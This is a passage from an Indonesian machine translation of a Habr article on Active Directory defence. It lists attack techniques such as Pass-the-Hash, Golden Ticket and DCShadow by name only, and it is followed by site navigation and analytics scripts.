style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bug Printer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dan Delegasi </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;">Tanpa Batasan</font></a><font style="vertical-align: inherit;"> , </font><font style="vertical-align: inherit;">serangan terhadap Exchange ( </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Penguasa</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PrivExchange</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExchangeRelayX</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) dapat secara signifikan memperluas cakupan serangan. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Teknik serangan dan metode penjepit (Tiket emas, Tiket perak, Pass-The-Hash, Over pass hash, SID History, DC Shadow, dll.) Terus berubah, dan tim pertahanan harus selalu siap untuk jenis serangan baru.</font></font></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id449278/">https://habr.com/ru/post/id449278/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id449264/index.html">Membuat sistem pelaporan untuk 1C: ERP berdasarkan OLAP dan Excel</a></li>
<li><a href="../id449266/index.html">3 laporan dengan RusCrypto: konferensi dengan pengalaman</a></li>
<li><a href="../id449270/index.html">Yandex telah menerbitkan ikhtisar pasar lowongan TI</a></li>
<li><a href="../id449274/index.html">Layar 7-segmen besar dengan lampu neon pada ESP8266</a></li>
<li><a href="../id449276/index.html">Karir berubah pada usia 35. Pengalaman saya dan kesuksesan pertama</a></li>
<li><a href="../id449280/index.html">Bagaimana platform gaming cloud untuk klien b2b dan b2c bekerja. Solusi untuk gambar yang bagus dan bertarung dengan mil terakhir</a></li>
<li><a href="../id449282/index.html">Cadangan, Bagian 1: Tujuan, Ikhtisar Teknik dan Teknologi</a></li>
<li><a href="../id449284/index.html">Saya menjual bawang secara online</a></li>
<li><a href="../id449286/index.html">Dapatkan API GraphQL saat bepergian</a></li>
<li><a href="../id449288/index.html">Tim apa yang dibutuhkan untuk membuat toko online yang benar-benar bagus?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>